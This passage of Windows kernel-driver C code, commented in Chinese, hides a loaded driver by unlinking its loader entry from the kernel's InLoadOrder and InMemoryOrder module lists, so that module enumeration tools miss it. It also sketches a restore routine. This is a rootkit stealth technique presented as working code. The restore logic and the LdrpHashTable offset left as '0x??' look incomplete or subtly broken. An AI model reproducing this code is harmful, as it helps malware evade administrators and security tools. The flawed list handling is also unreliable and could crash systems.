    RtlInitUnicodeString(&meName, L"\\??\\[你的驱动全路径.sys]"); // 或从 DriverObject->DriverSection 拿

    // DriverObject->DriverSection 直接就是 KLDR_DATA_TABLE_ENTRY*，最稳
    entry = (PKLDR_DATA_TABLE_ENTRY_LOCAL)DriverObject->DriverSection;
    if (!entry) return STATUS_NOT_FOUND;

    g_SavedInLoad   = entry->InLoadOrderLinks;
    g_SavedInMemory = entry->InMemoryOrderLinks;

    // 从 InLoadOrderLinks 双向链表摘除
    entry->InLoadOrderLinks.Blink->Flink = entry->InLoadOrderLinks.Flink;
    entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink;

    // 从 InMemoryOrderLinks 摘除
    entry->InMemoryOrderLinks.Blink->Flink = entry->InMemoryOrderLinks.Flink;
    entry->InMemoryOrderLinks.Flink->Blink = entry->InMemoryOrderLinks.Blink;

    // 从 LdrpHashTable 摘除（EnumDeviceDrivers 也走这条）
    // LdrpHashTable 位置：ntoskrnl!PsLoadedModuleList + 0x?? 或
    // 从 InLoadOrderLinks 里推，但更通用的是 PsLoadedModuleList 后固定偏移
    // 建议先跑 PsLoadedModuleList - <InLoadOrderLinks> 反推，别硬编码

    g_Hidden = TRUE;
    return STATUS_SUCCESS;
}

NTSTATUS
RestoreDriverVisibility(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    PKLDR_DATA_TABLE_ENTRY_LOCAL entry = (PKLDR_DATA_TABLE_ENTRY_LOCAL)DriverObject->DriverSection;
    if (!entry || !g_Hidden) return STATUS_SUCCESS;

    entry->InLoadOrderLinks = g_SavedInLoad;
    entry->InMemoryOrderLinks = g_SavedInMemory;

    // 重建双向链表（关键：不能只把 Blink/Flink 粘回去，要把邻居的指针也指回来）
    ListEntry_InsertAfter(&entry->InLoadOrderLinks, entry->InLoadOrderLinks.Flink, &g_SavedInLoad);
    ListEntry_InsertAfter(&entry->InMemoryOrderLinks, entry->InMemoryOrderLinks.Flink, &g_SavedInMemory);

    g_Hidden = FALSE;
    return STATUS_SUCCESS;
}
